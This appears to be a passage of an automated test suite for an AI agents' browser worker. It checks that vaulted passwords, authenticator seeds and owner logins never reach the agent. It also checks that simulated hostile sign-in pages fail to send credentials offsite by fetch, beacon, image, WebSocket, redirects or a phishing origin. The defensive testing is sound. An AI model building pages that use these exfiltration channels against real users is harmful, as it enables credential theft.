    expect(dl).toMatchObject({ fileName: "listings.csv" });
    const got = await ok(R.econ(A, "browser.fetch_file", { fileId: dl.fileId }));
    expect(Buffer.from(got.contentB64, "base64").toString()).toContain("Cash-flow workbook,12.00");
    expect((await R.econ(B, "browser.fetch_file", { fileId: dl.fileId })).code).toBe("FLEET_NOT_FOUND");
    // A link that opens a new tab: it becomes the current tab; the agent can go back to the first.
    const t = await browse(A, "browser.act", { sessionId: sid, steps: [{ action: "click", selector: "#pv" }, { action: "wait_idle" }] });
    expect(t.result.title).toBe("Listing preview");
    expect(t.result.tabs).toHaveLength(2);
    const back = await browse(A, "browser.act", { sessionId: sid, steps: [{ action: "tab", index: 0 }, { action: "screenshot" }] });
    expect(back.result.title).toBe("Edit listing");
    const shot = await ok(R.econ(A, "browser.fetch_file", { fileId: back.result.files[0].fileId }));
    expect(Buffer.from(shot.contentB64, "base64").subarray(0, 8).toString("hex")).toBe("89504e470d0a1a0a");
    // The agent's own design, rendered (a session without an account), then captured as an image and a PDF.
    const d = await browse(A, "browser.act", { sessionId: sid, steps: [{ action: "set_content", fileId: design.fileId }, { action: "screenshot", selector: "div" }, { action: "pdf" }] });
    expect(d.status, JSON.stringify(d.result)).toBe("done");
    expect(d.result.text).toContain("Ledgerline");
    const [img, pdf] = d.result.files;
    expect(img).toMatchObject({ kind: "screenshot" });
    const pdfBytes = Buffer.from((await ok(R.econ(A, "browser.fetch_file", { fileId: pdf.fileId }))).contentB64, "base64");
    expect(pdfBytes.subarray(0, 4).toString()).toBe("%PDF");
    // A name the agent invented: the worker never fetches a file that is not this agent's staged one.
    const forged = await browse(A, "browser.act", { sessionId: sid, steps: [{ action: "upload_file", selector: "#photo", fileId: crypto.randomUUID() }] });
    expect(forged.result.code).toBe("FLEET_BROWSER_FILE_UNAVAILABLE");
    await browse(A, "browser.close", { sessionId: sid });
  });

  it("v79 interfaces: a JavaScript profile wizard (dynamic content, hidden drop-zone input, validation) and a social composer (rich editor, image); the post recorded as presence", async () => {
    const png = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8cfc0f01f0005000201a5f6b1c20000000049454e44ae426082", "hex");
    const logo = await ok(R.econ(A, "browser.stage_file", { fileName: "ledgerline-logo.png", contentType: "image/png", contentB64: png.toString("base64") }));
    const o = await browse(A, "browser.open", { url: `${SITE}/studio/profile` });
    const sid = o.sessionId;
    const w = await browse(A, "browser.act", { sessionId: sid, steps: [{ action: "wait_for", selector: "#shop" },
      { action: "fill", selector: "#shop", value: "Ledgerline" }, { action: "fill", selector: "#about", value: "Cash-flow tools for freelancers" },
      { action: "upload_file", selector: "#logo", fileId: logo.fileId }, { action: "wait_for", selector: "#next:not([disabled])" }, { action: "click", selector: "#next" },
      { action: "wait_for", selector: "text=Profile saved" }] });
    expect(w.status, JSON.stringify(w.result)).toBe("done");
    expect(w.result.text).toContain("Profile saved for Ledgerline");
    const c = await browse(A, "browser.act", { sessionId: sid, steps: [{ action: "goto", url: `${SITE}/social/compose` },
      { action: "fill", selector: "#editor", value: "New: a cash-flow workbook for freelancers" }, { action: "upload_file", selector: "#media", fileId: logo.fileId },
      { action: "click", selector: "#post" }] });
    expect(c.status, JSON.stringify(c.result)).toBe("done");
    expect(c.result.text, c.result.text).toContain("Posted: view post with ledgerline-logo.png - New: a cash-flow workbook for freelancer");
    expect(c.result.text).toMatch(/41\/280/);
    // The agent records what it published, with the browser action as evidence (its channel's rules recorded first).
    await ok(R.econ(A, "venture.create", { key: "ledgers", model: "digital_product", offer: "cash-flow tools", state: "selected" }));
    const ch = await ok(R.econ(A, "channel.add", { ventureKey: "ledgers", name: "Sim social", kind: "social", status: "active", rulesSource: `${SITE}/terms`.replace("http://", "https://"),
      rulesSummary: "Automated posting through the composer is allowed for business accounts; AI-generated posts must be labelled." }));
    const post = (c.result.links as Array<{ text: string; href: string }>).find((l) => l.text === "view post")!;
    const item = await ok(R.econ(A, "presence.record", { channelId: ch.channel.channelId, kind: "post", title: "Cash-flow workbook launch post", status: "live",
      url: post.href.replace("http://", "https://"), evidenceActionId: c.actionId ?? c.result.actionId ?? (await R.q(`SELECT action_id FROM fleet.fleet_browser_actions WHERE agent_id = $1 ORDER BY created_at DESC LIMIT 1`, [A.id]))[0].action_id }));
    expect(item.item).toMatchObject({ status: "live", kind: "post" });
    expect((await R.econ(B, "presence.record", { channelId: ch.channel.channelId, kind: "post", title: "x" })).code).toBe("FLEET_NOT_FOUND");
    await browse(A, "browser.close", { sessionId: sid });
  });

  it("v79: no image leaves a session that captured a secret; a password change is pending until the agent confirms the site accepted it", async () => {
    // sessionId captured the dashboard's API key earlier: a screenshot of that session is refused.
    const shot = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/dashboard` }, { action: "screenshot" }] });
    expect(shot.result.code).toBe("FLEET_BROWSER_CAPTURE_REFUSED");
    const old = users.get("mayahart")!.password;
    await ok(R.econ(A, "account.mark", { accountId, status: "active", note: "back to normal" }));
    // A rejected change (the confirmation does not match): the site keeps the old password, and so does the vault.
    const bad = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/account/password` }, { action: "fill", selector: "#cur", credential: "password" },
      { action: "fill", selector: "#new1", credential: "generate_password" }, { action: "fill", selector: "#new2", value: "something-else" }, { action: "click", text: "Change" }] });
    expect(bad.result.text).toContain("Password not changed");
    expect(users.get("mayahart")!.password).toBe(old);
    const creds = async () => (await R.q(`SELECT status FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 AND kind = 'password' AND status IN ('active','pending') ORDER BY status`, [accountId])).map((x) => x.status);
    expect(await creds()).toEqual(["active", "pending"]);
    await ok(R.econ(A, "account.password_discard", { accountId }));
    expect(await creds()).toEqual(["active"]);
    // An accepted change: the new password (filled twice, never seen) is pending until confirmed; then it is the account's.
    const good = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/account/password` }, { action: "fill", selector: "#cur", credential: "password" },
      { action: "fill", selector: "#new1", credential: "generate_password" }, { action: "fill", selector: "#new2", credential: "new_password" }, { action: "click", text: "Change" }] });
    expect(good.result.text, JSON.stringify(good.result)).toContain("Password changed");
    const now = users.get("mayahart")!.password;
    expect(now).not.toBe(old);
    expect(await creds()).toEqual(["active", "pending"]);
    await ok(R.econ(A, "account.password_confirm", { accountId }));
    expect(await creds()).toEqual(["active"]);
    const login = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/login` }, { action: "fill", selector: "#user", credential: "username" },
      { action: "fill", selector: "#pass", credential: "password" }, { action: "click", text: "Log in" }, { action: "wait_for", selector: "#key" }] });
    expect(login.status, JSON.stringify(login.result)).toBe("done");
    expect(JSON.stringify(results)).not.toContain(now);
  });

  it("v79 account continuity: after the browser worker restarts, the agent regains its account from the vault — password + authenticator, or an emailed code — never seeing either", async () => {
    // Set up an authenticator on the agent's own account: the key shown on the page is captured into the vault.
    const setup = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/security` }, { action: "capture", selector: "#seed", kind: "totp" },
      { action: "fill", selector: "#code", credential: "totp" }, { action: "click", text: "Enable" }] });
    expect(setup.result?.text, JSON.stringify(setup)).toContain("Two-step verification enabled");
    // The worker restarts (deploy, crash): every in-memory browser session is gone.
    await worker.close();
    worker = new BrowserWorker(bgw, { executablePath: CHROME!, allowLoopback: true, ignoreHttpsErrors: true, brokerPublicKey: async () => (await bgw.brokerKey()).ownerPub });
    const lost = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/dashboard` }] });
    expect(lost.result.code).toBe("FLEET_BROWSER_SESSION_LOST");
    expect((await R.econ(A, "browser.observe", { sessionId })).code).toBe("FLEET_BROWSER_CLOSED");
    // A fresh session for the same account: password from the vault, then the authenticator code generated by the broker.
    const o = await browse(A, "browser.open", { url: `${SITE}/login`, accountId });
    const back = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "fill", selector: "#user", credential: "username" },
      { action: "fill", selector: "#pass", credential: "password" }, { action: "click", text: "Log in" }, { action: "fill", selector: "#otp", credential: "totp" },
      { action: "click", text: "Verify" }, { action: "wait_for", selector: "#key" }] });
    expect(back.status, JSON.stringify(back.result)).toBe("done");
    expect(back.result.title).toBe("Dashboard");
    // Or by an emailed one-time code to the account's routing address (withheld from the agent, served by the broker).
    const e = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/login/email` },
      { action: "fill", selector: "#em", credential: "email" }, { action: "click", text: "Send code" }] });
    expect(e.result.title).toBe("Enter your code");
    for (let i = 0; i < 40 && !(await R.q(`SELECT 1 FROM fleet.fleet_auth_message_blobs WHERE used_at IS NULL AND blob IS NOT NULL`)).length; i++) await new Promise((r) => setTimeout(r, 100));
    const code = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "fill", selector: "#code", credential: "email_code" }, { action: "click", text: "Sign in" },
      { action: "wait_for", selector: "#key" }] });
    expect(code.status, JSON.stringify(code.result)).toBe("done");
    const seed = users.get("mayahart")!.totpSeed!;
    expect(JSON.stringify(results)).not.toContain(seed);
    expect(JSON.stringify(await R.q(`SELECT jsonb_agg(result) r FROM fleet.fleet_browser_actions`))).not.toContain(seed);
    expect((await R.q(`SELECT kind FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 AND status = 'active' ORDER BY kind`, [accountId])).map((x) => x.kind))
      .toEqual(["api_key", "password", "totp"]);
    await browse(A, "browser.close", { sessionId: o.sessionId });
  });

  it("v80: under a scoped release the worker refuses an outward step on a page outside the released origins (a click navigated away)", async () => {
    await R.q(`SELECT fleet.fleet_admin_sales_set(false, $1)`, [OWNER]);
    try {
      await R.q(`SELECT fleet.fleet_admin_outward_release($1, $2::jsonb, 'proof: the shop only', $3)`, [A.id, JSON.stringify({ actions: ["browser"], accounts: [accountId], origins: [SITE], expiresHours: 1 }), OWNER]);
      const o = await browse(A, "browser.open", { url: `${SITE}/out`, accountId });
      const r = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "click", selector: "#away" }, { action: "click", text: "Continue" }] });
      expect(r.status).toBe("failed");
      expect(r.result).toMatchObject({ code: "FLEET_OUTWARD_SCOPE", stepsDone: 1 });
      await browse(A, "browser.close", { sessionId: o.sessionId });
    } finally {
      await R.q(`SELECT fleet.fleet_admin_outward_hold($1, $2)`, [A.id, OWNER]);
      await R.q(`SELECT fleet.fleet_admin_sales_set(true, $1)`, [OWNER]);
    }
  });

  it("v126: a control: outside sign_in these hostile pages really do send a value away", async () => {
    offsite.length = 0;
    const c = await ok(R.econ(A, "browser.open", { url: `${SITE}/atk/script` }));
    const value = "control-value-123";
    await browse(A, "browser.observe", { sessionId: c.sessionId });
    const r = await browse(A, "browser.act", { sessionId: c.sessionId, steps: [{ action: "fill", selector: "#pass", value }, { action: "wait", ms: 800 }] });
    expect(r.status, JSON.stringify(r.result)).toBe("done");
    for (const where of ["/fetch", "/beacon", "/img?", "/img64?", "/get?", "WS /ws"]) expect(offsite.join("\n"), where).toContain(where);
    offsite.length = 0;
    await browse(A, "browser.act", { sessionId: c.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/chain` }, { action: "fill", selector: "#pass", value }, { action: "click", selector: "#go" }, { action: "wait", ms: 500 }] });
    expect(offsite.join("\n")).toContain(value);
    await browse(A, "browser.close", { sessionId: c.sessionId });
  });

  it("v126: the whole flow in real Chrome: the owner's login is sealed and signs in; the agent works in that session and never has the login", async () => {
    const password = `Owner'!-${crypto.randomUUID()}`, seed = "JBSWY3DPEHPK3PXP", handle = "ownerflow";
    users.set(handle, { email: "owner@site.test", password, verified: true, totpSeed: seed, totpOn: true });
    const pub = Buffer.from((broker as any).o.ownerVault.publicKeyBase64(), "base64");
    const seal = (who: { handle: string; loginUrl: string; platform?: string; agentId?: string }, v: unknown) => sealAccountLogin(pub, { agentId: A.id, platform: "flow.test", ...who }, JSON.stringify(v));
    const hand = async (who: string, url: string, sealed: Buffer) => (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'flow.test', $2, $3, $4, $5) AS r`, [A.id, url, who, sealed, OWNER]))[0].r as any;
    const h = await hand(handle, `${SITE}/login`, seal({ handle, loginUrl: `${SITE}/login` }, { password, totpSeed: seed }));
    await broker.tick();
    const creds = async (id: string) => (await R.q(`SELECT kind, status, vault_ref FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 ORDER BY kind, status`, [id])) as any[];
    expect((await creds(h.accountId)).map((c) => `${c.kind}:${c.status}`)).toEqual(["password:active", "totp:active"]);
    expect(await R.q(`SELECT 1 FROM fleet.fleet_account_handover_inbox WHERE account_id = $1 AND sealed IS NOT NULL`, [h.accountId])).toHaveLength(0);
    const task = (await R.q(`SELECT body FROM fleet.fleet_owner_tasks WHERE agent_id = $1 AND closed_at IS NULL ORDER BY created_at DESC LIMIT 1`, [A.id]))[0] as any;
    expect(task.body).toContain(h.accountId);
    expect(task.body).toContain("sign_in");

    const open = async (accountId: string, url = `${SITE}/out`) => (await ok(R.econ(A, "browser.open", { url, accountId }))).sessionId as string;
    const seen: unknown[] = [];
    const act = async (id: string, steps: any[]) => { const r = await browse(A, "browser.act", { sessionId: id, steps }); seen.push(r); return r; };
    let sid = await open(h.accountId);
    await browse(A, "browser.observe", { sessionId: sid });

    // Signing in: password and authenticator, and the session arrives in the agent's context.
    const signed = await act(sid, [{ action: "sign_in" }]);
    expect(signed.status, JSON.stringify(signed.result)).toBe("done");
    expect(signed.result.url).toBe(`${SITE}/dashboard`);
    // Routine work carries on, including an image: the login was never in this browser context.
    const work = await act(sid, [{ action: "goto", url: `${SITE}/listing/preview` }, { action: "screenshot" }]);
    expect(work.status, JSON.stringify(work.result)).toBe("done");
    expect(work.result.text).toContain("Cash-flow workbook");
    expect(work.result.files).toHaveLength(1);
    expect((await act(sid, [{ action: "goto", url: `${SITE}/dashboard` }])).result.url).toBe(`${SITE}/dashboard`);

    // The agent cannot ask for the login, by the worker or, separately, from the registry.
    await act(sid, [{ action: "goto", url: `${SITE}/login` }]);
    for (const credential of ["password", "totp", "generate_password", "new_password", "api_key"]) expect((await act(sid, [{ action: "fill", selector: "#pass", credential }])).result.code, credential).toBe("FLEET_OWNER_ACCOUNT");
    const bx = new pg.Pool({ connectionString: R.pgc.browserUrl, max: 1 });
    try {
      const lease = crypto.randomBytes(32).toString("base64url");
      const queued = await econNext(R, A, "browser.observe", { sessionId: sid });
      const claim = (await bx.query(`SELECT fleet.bx_claim_action('browser-worker', $1) AS r`, [crypto.createHash("sha256").update(lease).digest("hex")])).rows[0].r;
      expect(claim.action.actionId).toBe(queued.actionId);
      expect(claim.action).toMatchObject({ ownerAccount: true, loginUrl: `${SITE}/login` });
      for (const kind of ["password", "totp", "generate_password", "new_password", "auth_link", "capture:password"]) {
        expect((await bx.query(`SELECT fleet.bx_secret_request($1, $2, $3, $4, 'k', NULL) AS r`, [claim.action.actionId, lease, kind, SITE])).rows[0].r, kind).toMatchObject({ ok: false, code: "FLEET_OWNER_ACCOUNT" });
      }
      await bx.query(`SELECT fleet.bx_report_action($1, $2, true, '{}'::jsonb, NULL)`, [claim.action.actionId, lease]);
    } finally { await bx.end(); }
    // sign_in is alone in its action, and only in a session with an account.
    expect((await econNext(R, A, "browser.act", { sessionId: sid, steps: [{ action: "sign_in" }, { action: "wait", ms: 1 }] })).code).toBe("FLEET_BAD_REQUEST");

    // A guess cannot be confirmed: the login is not held where a page's echo would be redacted.
    const guess = await act(sid, [{ action: "goto", url: `${SITE}/atk/echo-guess?q=${encodeURIComponent(password)}` }]);
    expect(guess.result.title).toBe(`Echo ${password}`);
    seen.pop(); // the test typed this itself, and the sweep below looks for it
    results.pop();
    await act(sid, [{ action: "goto", url: `${SITE}/login` }]);
    expect((await act(sid, [{ action: "fill", selector: "#pass", credential: "username" }])).result.code, "the name into a password field").toBe("FLEET_OWNER_ACCOUNT");
    await act(sid, [{ action: "goto", url: `${SITE}/atk/labelled` }]);
    for (const selector of ["#lb", "#sp"]) {
      expect((await act(sid, [{ action: "fill", selector, value: "agents-own-password" }])).result.code, selector).toBe("FLEET_OWNER_ACCOUNT");
      expect((await act(sid, [{ action: "fill", selector, credential: "username" }])).result.code, selector).toBe("FLEET_OWNER_ACCOUNT");
    }
    await act(sid, [{ action: "goto", url: `${SITE}/login` }]);
    // The agent cannot replace it.
    expect((await act(sid, [{ action: "fill", selector: "#pass", value: "agents-own-password" }])).result.code).toBe("FLEET_OWNER_ACCOUNT");
    for (const key of ["a", "Space", "Control+v"]) expect((await act(sid, [{ action: "press", key }])).result.code, key).toBe("FLEET_OWNER_ACCOUNT");
    expect((await act(sid, [{ action: "goto", url: `${SITE}/account/password` }])).status, "the password page").toBe("failed");
    for (const a of [{ action: "capture", selector: "body", kind: "api_key" }, { action: "open_auth_link" }]) expect((await act(sid, [a])).result.code, a.action).toBe("FLEET_OWNER_ACCOUNT");
    await browse(A, "browser.close", { sessionId: sid });

    // The sign-in page itself turns hostile. Each is a real account whose login page is the attack: nothing reaches the other origin, and the agent's result holds nothing.
    let n = 0;
    const attempt = async (path: string) => {
      const who = `hostile${++n}`;
      users.set(who, { email: "o@site.test", password, verified: true });
      const x = await hand(who, `${SITE}${path}`, seal({ handle: who, loginUrl: `${SITE}${path}` }, { password }));
      await broker.tick();
      const id = await open(x.accountId);
      await browse(A, "browser.observe", { sessionId: id });
      const r = await act(id, [{ action: "sign_in" }]);
      await browse(A, "browser.close", { sessionId: id });
      return r;
    };
    offsite.length = 0;
    for (const path of ["/atk/script", "/atk/307", "/atk/chain", "/atk/formaction", "/atk/echo", "/atk/popup"]) await attempt(path);
    const away = offsite.join("\n");
    for (const f of secretForms(password)) expect(away, f).not.toContain(f);
    expect(offsite.filter((x) => !x.startsWith("GET "))).toEqual([]);
    offsite.length = 0;
    expect((await attempt("/atk/stash")).result.code, "a login stashed in browser storage does not come across").toBe("FLEET_SIGNIN_FORM");
    await attempt("/atk/script2");
    expect(offsite.join("\n"), "no redirect, worker or peer connection carried it").not.toMatch(/open-redirect|worker/);
    expect((await attempt("/atk/get-form")).result.code, "a form that would put it in an address").toBe("FLEET_SIGNIN_FORM");
    // A search box before the form does not get the name, and the name reaches the right field.
    const searched = await attempt("/atk/search-first");
    expect(searched.status, JSON.stringify(searched.result)).toBe("done");
    offsite.length = 0;
    const seenSink = (await attempt("/atk/get-button"));
    expect(seenSink.result.url ?? "", "a button that turns the form into a GET").not.toContain("pass=");
    // A box called code that says it is a promotion gets nothing either.
    const promoCode = await attempt("/atk/promo-code-login");
    expect(promoCode.status, JSON.stringify(promoCode.result)).toBe("done");
    // A box that only looks like the code gets nothing.
    const promo = await attempt("/atk/promo-login");
    expect(promo.status, JSON.stringify(promo.result)).toBe("done");
    expect(promo.result.url).toBe(`${SITE}/atk/promo`);
    // A form that posts elsewhere, a page that is not a password form, a login page that moved: nothing is asked for.
    const before = (await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_browser_secret_requests WHERE kind = 'password'`))[0].n;
    expect((await attempt("/atk/form-off")).result.code).toBe("FLEET_ORIGIN_NOT_PINNED");
    expect((await attempt("/atk/swap")).result.code).toBe("FLEET_SIGNIN_FORM");
    expect((await attempt("/atk/moved")).result.code).toBe("FLEET_SIGNIN_MOVED");
    expect((await attempt("/captcha")).result.code).toBe("FLEET_SIGNIN_HUMAN");
    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_browser_secret_requests WHERE kind = 'password'`))[0].n).toBe(before);
    // An ordinary same-site redirect after the form works.
    const fine = await attempt("/atk/302");
    expect(fine.status, JSON.stringify(fine.result)).toBe("done");
    expect(fine.result.url).toBe(`${SITE}/atk/sink`);

    // Nothing the agent can read, and nothing stored, holds it in any form, even after a page echoed it.
    const everything = JSON.stringify(seen) + JSON.stringify(results) + JSON.stringify(await R.q(`SELECT (SELECT jsonb_agg(result) FROM fleet.fleet_browser_actions WHERE steps::text NOT LIKE '%echo-guess%') a, (SELECT jsonb_agg(steps) FROM fleet.fleet_browser_actions WHERE steps::text NOT LIKE '%echo-guess%') s,
      (SELECT jsonb_agg(detail) FROM fleet.fleet_events) e, (SELECT jsonb_agg(body) FROM fleet.fleet_owner_tasks) t`));
    for (const f of secretForms(password)) expect(everything, f).not.toContain(f);
    expect(everything).not.toContain(seed);

    // A freeze stops a session already signed in, and new sign-ins.
    const frozen = await open(h.accountId);
    await browse(A, "browser.observe", { sessionId: frozen });
    await R.q(`SELECT fleet.fleet_admin_account_freeze($1, 'test', $2)`, [h.accountId, OWNER]);
    const stopped = JSON.stringify(await R.econ(A, "browser.act", { sessionId: frozen, steps: [{ action: "goto", url: `${SITE}/dashboard` }] }).catch((e: Error) => ({ code: e.message })));
    expect(stopped).toMatch(/FLEET_ACCOUNT_FROZEN/);
    await R.q(`SELECT fleet.fleet_admin_account_unfreeze($1, 'active', $2)`, [h.accountId, OWNER]);
    await browse(A, "browser.close", { sessionId: frozen });
    // The sign-in page is given as a page: not a bare site, not a default port, no query.
    for (const bad of ["https://shop.test", "https://shop.test:443/login", "https://shop.test/login?next=/x"]) {
      await expect(R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'flow.test', $2, 'badurl', $3, $4)`, [A.id, bad, Buffer.alloc(64, 1), OWNER]), bad).rejects.toThrow(/FLEET_ORIGIN_INVALID/);
    }

    // A re-seal: a failed or pending one changes nothing; a login sealed for another account, site or agent is refused.
    const state = async () => (await R.q(`SELECT origins, login_url FROM fleet.fleet_agent_accounts WHERE account_id = $1`, [h.accountId]))[0];
    const was = await state();
    const replay = await hand(handle, `${PHISH}/login`, seal({ handle, loginUrl: `${SITE}/login` }, { password }));
    expect(await state(), "pending").toEqual(was);
    await broker.tick();
    expect((await R.q(`SELECT status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [replay.uploadId]))[0].status).toBe("failed");
    expect(await state(), "failed").toEqual(was);
    expect(await R.q(`SELECT 1 FROM fleet.fleet_notifications WHERE code = 'ACCOUNT_HANDOVER_FAILED' AND detail ->> 'accountId' = $1`, [h.accountId])).toHaveLength(1);
    expect((await creds(h.accountId)).filter((c) => c.status === "active")).toHaveLength(2);
    sid = await open(h.accountId);
    await browse(A, "browser.observe", { sessionId: sid });
    expect((await act(sid, [{ action: "sign_in" }])).result.url, "the old login still works").toBe(`${SITE}/dashboard`);
    await browse(A, "browser.close", { sessionId: sid });
    // A successful one moves the site and destroys the old login.
    const oldRefs = (await creds(h.accountId)).map((c) => c.vault_ref as string);
    const moved = await hand(handle, `${PHISH}/signin`, seal({ handle, loginUrl: `${PHISH}/signin` }, { password: `${password}-new` }));
    await broker.tick();
    expect((await R.q(`SELECT status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [moved.uploadId]))[0].status).toBe("installed");
    expect(await state()).toEqual({ origins: [PHISH.toLowerCase()], login_url: `${PHISH}/signin` });
    for (const ref of oldRefs) expect((broker as any).vault.shred(ref), "already destroyed").toBe(false);
    // The agent's own-account path and account operations stay refused on the owner's account.
    const refused = (p: Promise<any>) => p.catch((e: Error) => ({ ok: false, code: e.message }));
    for (const op of ["account.revoke", "account.close", "account.rotate", "account.recover", "account.operate", "account.verify_identity"]) {
      expect(JSON.stringify(await refused(R.econ(A, op, { accountId: h.accountId, reason: "not mine to do", kind: "password" }))), op).toMatch(/FLEET_OWNER_ACCOUNT/);
    }
    expect(JSON.stringify(await refused(R.econ(A, "account.add_origin", { accountId: h.accountId, origin: "https://elsewhere.test" })))).toMatch(/FLEET_OWNER_ACCOUNT/);
    expect(JSON.stringify(await refused(R.econ(A, "account.password_confirm", { accountId: h.accountId })))).toMatch(/FLEET_OWNER_ACCOUNT/);
    expect(JSON.stringify(await refused(R.econ(A, "account.mark", { accountId: h.accountId, status: "closed" })))).toMatch(/FLEET_OWNER_ACCOUNT/);
    await ok(R.econ(A, "account.mark", { accountId: h.accountId, status: "human_action_required", note: "a CAPTCHA needs the owner" }));
    // Only the owner role can hand over.
    const acl = await R.q(`SELECT r, has_function_privilege(r, 'fleet.fleet_admin_account_handover(text, text, text, text, text, bytea, text)', 'EXECUTE') AS can FROM unnest(ARRAY['fleet_agent','fleet_service','fleet_browser','fleet_operator','fleet_identity']) r`);
    expect(acl.filter((x: any) => x.can)).toEqual([]);
  }, 120_000);

  it("v126: a redirect onto an address the policy refuses shows the agent nothing of it", async () => {
    const blocked = new (class extends HostResolutionPolicy { override async allowed(url: string, o?: { allowLoopback?: boolean }) { return !url.startsWith(PHISH) && super.allowed(url, o); } })();
    (worker as any).hosts = blocked;
    try {
      const o = await ok(R.econ(A, "browser.open", { url: `${SITE}/out` }));
      await browse(A, "browser.observe", { sessionId: o.sessionId });
      const r = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/bounce` }] });
      expect(r.result.code).toBe("FLEET_BROWSER_URL_BLOCKED");
      expect(r.result.url).toBe("about:blank");
      expect(JSON.stringify(r.result)).not.toContain("Session expired");
      // In the same action, nothing is captured of it either.
      const shot = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/bounce` }, { action: "screenshot" }] });
      expect(shot.result.code).toBe("FLEET_BROWSER_URL_BLOCKED");
      expect(shot.result.files).toBeUndefined();
      // A dead link is not a refused address: it stays an ordinary failed page.
      const dead = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/dead` }, { action: "click", selector: "#dead" }] });
      expect(dead.result.code, JSON.stringify(dead.result)).not.toBe("FLEET_BROWSER_URL_BLOCKED");
      await browse(A, "browser.close", { sessionId: o.sessionId });
    } finally { (worker as any).hosts = new HostResolutionPolicy(); }
  });

  it("v126: too many sign-ins in an hour stop before the site locks the account out", async () => {
    const who = "ownerlimit", password = `Owner-${crypto.randomUUID()}`;
    users.set(who, { email: "o@site.test", password: "something-else", verified: true });
    const pub = Buffer.from((broker as any).o.ownerVault.publicKeyBase64(), "base64");
    const x = (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'flow.test', $2, $3, $4, $5) AS r`, [A.id, `${SITE}/login`, who, sealAccountLogin(pub, { agentId: A.id, platform: "flow.test", handle: who, loginUrl: `${SITE}/login` }, JSON.stringify({ password })), OWNER]))[0].r as any;
    await broker.tick();
    const id = (await ok(R.econ(A, "browser.open", { url: `${SITE}/out`, accountId: x.accountId }))).sessionId as string;
    await browse(A, "browser.observe", { sessionId: id });
    for (let i = 0; i < 5; i++) expect((await browse(A, "browser.act", { sessionId: id, steps: [{ action: "sign_in" }] })).result.code, `try ${i}`).toBe("FLEET_SIGNIN_FAILED");
    expect((await browse(A, "browser.act", { sessionId: id, steps: [{ action: "sign_in" }] })).result.code).toBe("FLEET_SIGNIN_LIMIT");
    await browse(A, "browser.close", { sessionId: id });
  }, 120_000);

  it("scope and reach: sessions are per agent; private addresses are unreachable; roles are least-privilege", async () => {
    sessionId = (await browse(A, "browser.open", { url: `${SITE}/login`, accountId })).sessionId; // the old one ended with the worker restart
    expect((await R.econ(B, "browser.act", { sessionId, steps: [{ action: "goto", url: SITE }] })).code).toBe("FLEET_BROWSER_NONE");
    expect((await R.econ(B, "browser.open", { url: SITE, accountId })).code).toBe("FLEET_NOT_FOUND");
    const x = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: "http://10.11.12.13/admin" }] });
    expect(x.result.code).toBe("FLEET_BROWSER_URL_BLOCKED");
    expect((await econNext(R, A, "browser.act", { sessionId, steps: [{ action: "fill", selector: "#a", credential: "password", value: "x" }] })).code).toBe("FLEET_BAD_REQUEST");
    await browse(A, "browser.close", { sessionId });
    expect((await R.econ(A, "browser.observe", { sessionId })).code).toBe("FLEET_BROWSER_CLOSED");
    const bx = new pg.Pool({ connectionString: R.pgc.browserUrl, max: 1 });
    try {
      expect(await R.code(bx.query(`SELECT * FROM fleet.fleet_agent_account_credentials`))).toBe("permission denied");
      expect(await R.code(bx.query(`SELECT fleet.ix_browser_secrets_pending('x')`))).toBe("permission denied");
    } finally { await bx.end(); }
    expect((await auditPrivileges(R.owner, { schema: "fleet", requireIdentityRoles: true, requireBrowserRoles: true })).problems).toEqual([]);
  });
});
